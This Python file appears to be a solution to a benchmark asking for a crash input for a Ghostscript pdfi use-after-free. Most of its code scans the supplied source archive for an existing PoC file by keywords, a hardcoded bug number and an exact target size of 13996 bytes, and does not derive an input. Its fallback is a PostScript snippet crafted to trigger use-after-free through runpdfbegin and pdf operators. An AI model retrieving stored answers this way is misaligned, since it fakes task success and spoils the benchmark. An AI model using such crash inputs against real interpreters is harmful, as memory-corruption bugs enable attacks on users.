import os
import tarfile
import zipfile


class Solution:
    TARGET_SIZE = 13996

    def solve(self, src_path: str) -> bytes:
        data = None

        if os.path.isdir(src_path):
            data = self._find_poc_in_dir(src_path)
        else:
            if tarfile.is_tarfile(src_path):
                data = self._find_poc_in_tar(src_path)
            elif zipfile.is_zipfile(src_path):
                data = self._find_poc_in_zip(src_path)

        if data is None:
            data = self._fallback_poc()

        return data

    def _fallback_poc(self) -> bytes:
        # Generic small PostScript snippet attempting to exercise PDF interpreter
        ps = b"""%!PS-Adobe-3.0
% Fallback PoC: attempt to exercise pdf interpreter from PostScript.
% This is a generic input used when no dedicated PoC file is found.
% It intentionally tries to invoke PDF-related operators even if the
% setup fails, which may trigger use-after-free bugs in pdfi contexts.

/try_runpdfbegin {
  (%stdin) (r) file runpdfbegin
} bind def

errordict /undefinedfilename {
  % Ignore file-open errors.
  pop pop
} bind put

% Try to start PDF interpreter with an invalid input stream.
try_runpdfbegin

% Now invoke a few PDF-related operators that may assume a valid pdfi context.
/try_pdf_ops {
  % These operators exist in Ghostscript-based interpreters; if not defined
  % they will trigger 'undefined', which is acceptable for fallback.
  /pdfpagecount where {
    pop pdfpagecount pop
  } if
  /pdfpeekpage where {
    pop 1 pdfpeekpage
  } if
} bind def

try_pdf_ops

quit
"""
        return ps

    def _normalize_path(self, path: str) -> str:
        return path.replace("\\", "/")

    def _name_score(self, name: str) -> int:
        n = self._normalize_path(name).lower()
        score = 0

        base = os.path.basename(n)
        ext = os.path.splitext(base)[1]

        # Extension-based scoring
        if ext in (".ps", ".eps"):
            score += 40
        elif ext == ".pdf":
            score += 35
        elif ext in (".txt", ".bin", ".dat"):
            score += 10

        # Penalize obvious source code / build artifacts
        code_exts = {
            ".c",
            ".h",
            ".cpp",
            ".cc",
            ".cxx",
            ".hpp",
            ".py",
            ".java",
            ".js",
            ".ts",
            ".go",
            ".rb",
            ".php",
            ".sh",
            ".bat",
            ".m",
            ".mm",
            ".cs",
            ".rs",
            ".swift",
            ".pl",
            ".pm",
            ".mak",
            ".cmake",
            ".sln",
            ".vcxproj",
            ".vcproj",
        }
        if ext in code_exts:
            score -= 60

        # Tokens in full name
        token_weights = {
            "poc": 40,
            "repro": 35,
            "crash": 35,
            "uaf": 35,
            "use-after-free": 40,
            "heap-use-after-free": 40,
            "heap_uaf": 30,
            "asan": 20,
            "bug": 20,
            "bugs": 15,
            "id:": 20,
            "id_": 20,
            "id-": 20,
            "42280": 45,
            "pdfi": 25,
            "pdf": 10,
            "ps": 5,
            "fuzz": 15,
            "oss-fuzz": 25,
            "testcase": 15,
            "tests": 5,
        }

        for tok, w in token_weights.items():
            if tok in n:
                score += w

        # Directory components
        parts = n.split("/")
        dir_tokens = {
            "poc",
            "pocs",
            "crash",
            "crashes",
            "bugs",
            "bug",
            "regress",
            "regression",
            "tests",
            "testcases",
            "oss-fuzz",
            "fuzz",
        }
        for p in parts[:-1]:
            if p in dir_tokens:
                score += 15

        return score

    def _size_score(self, size: int, target: int) -> int:
        diff = abs(size - target)
        if diff == 0:
            return 60
        if diff <= 50:
            return 45
        if diff <= 100:
            return 40
        if diff <= 500:
            return 30
        if diff <= 1000:
            return 20
        if diff <= 5000:
            return 10
        if diff <= 20000:
            return 5
        return 0

    def _data_score(self, data: bytes) -> int:
        score = 0
        prefix = data[:1024]

        # Headers for PDF / PostScript
        if prefix.startswith(b"%PDF-"):
            score += 70
        if prefix.startswith(b"%!PS") or prefix.startswith(b"%!Adobe-PS"):
            score += 70

        # Look for pdf-related markers
        if b"pdfi" in prefix:
            score += 30
        if b"PDF" in prefix:
            score += 10
        if b"runpdfbegin" in prefix or b"pdfpagecount" in prefix:
            score += 40
        if b"%!PS" in prefix:
            score += 10
        if b"%PDF-" in prefix:
            score += 10

        # Light penalty for obviously text-only generic docs
        if b"Copyright" in prefix and b"License" in prefix:
            score -= 10

        return score

    def _find_poc_in_tar(self, tar_path: str):
        try:
            tf = tarfile.open(tar_path, "r:*")
        except tarfile.TarError:
            return None

        try:
            members = [
                m
                for m in tf.getmembers()
                if m.isfile() and 0 < m.size <= 5_000_000
            ]
            if not members:
                return None

            target = self.TARGET_SIZE
            exact = []
            others = []

            for m in members:
                size = m.size
                name = m.name
                base_name_score = self._name_score(name)

                if size == target:
                    score = 100 + base_name_score
                    exact.append((score, m))
                else:
                    score = self._size_score(size, target) + base_name_score
                    others.append((score, m))

            if exact:
                exact.sort(key=lambda x: (-x[0], x[1].name))
                candidate_members = [m for _, m in exact]
            elif others:
                others.sort(key=lambda x: (-x[0], x[1].name))
                candidate_members = [m for _, m in others[:20]]
            else:
                return None

            best_data = None
            best_score = float("-inf")

            for m in candidate_members:
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue

                if not data:
                    continue

                ds = self._data_score(data)
                total_score = ds + self._name_score(m.name)

                if total_score > best_score:
                    best_score = total_score
                    best_data = data

                if ds >= 60 and len(data) == target:
                    best_data = data
                    break

            return best_data
        finally:
            tf.close()

    def _find_poc_in_zip(self, zip_path: str):
        try:
            zf = zipfile.ZipFile(zip_path, "r")
        except Exception:
            return None

        try:
            infos = [
                info
                for info in zf.infolist()
                if not info.is_dir() and 0 < info.file_size <= 5_000_000
            ]
            if not infos:
                return None

            target = self.TARGET_SIZE
            exact = []
            others = []

            for info in infos:
                size = info.file_size
                name = info.filename
                base_name_score = self._name_score(name)

                if size == target:
                    score = 100 + base_name_score
                    exact.append((score, info))
                else:
                    score = self._size_score(size, target) + base_name_score
                    others.append((score, info))

            if exact:
                exact.sort(key=lambda x: (-x[0], x[1].filename))
                candidate_infos = [i for _, i in exact]
            elif others:
                others.sort(key=lambda x: (-x[0], x[1].filename))
                candidate_infos = [i for _, i in others[:20]]
            else:
                return None

            best_data = None
            best_score = float("-inf")

            for info in candidate_infos:
                try:
                    data = zf.read(info)
                except Exception:
                    continue

                if not data:
                    continue

                ds = self._data_score(data)
                total = ds + self._name_score(info.filename)

                if total > best_score:
                    best_score = total
                    best_data = data

                if ds >= 60 and len(data) == target:
                    best_data = data
                    break

            return best_data
        finally:
            zf.close()

    def _find_poc_in_dir(self, root: str):
        target = self.TARGET_SIZE
        candidates_exact = []
        candidates_others = []

        for dirpath, _, filenames in os.walk(root):
            for fname in filenames:
                path = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue

                if size <= 0 or size > 5_000_000:
                    continue

                relpath = os.path.relpath(path, root)
                base_name_score = self._name_score(relpath)

                if size == target:
                    score = 100 + base_name_score
                    candidates_exact.append((score, path))
                else:
                    score = self._size_score(size, target) + base_name_score
                    candidates_others.append((score, path))

        if candidates_exact:
            candidates_exact.sort(key=lambda x: -x[0])
            candidate_paths = [p for _, p in candidates_exact]
        elif candidates_others:
            candidates_others.sort(key=lambda x: -x[0])
            candidate_paths = [p for _, p in candidates_others[:20]]
        else:
            return None

        best_data = None
        best_score = float("-inf")

        for path in candidate_paths:
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except OSError:
                continue

            if not data:
                continue

            ds = self._data_score(data)
            total = ds + self._name_score(os.path.relpath(path, root))

            if total > best_score:
                best_score = total
                best_data = data

            if ds >= 60 and len(data) == target:
                best_data = data
                break

        return best_data
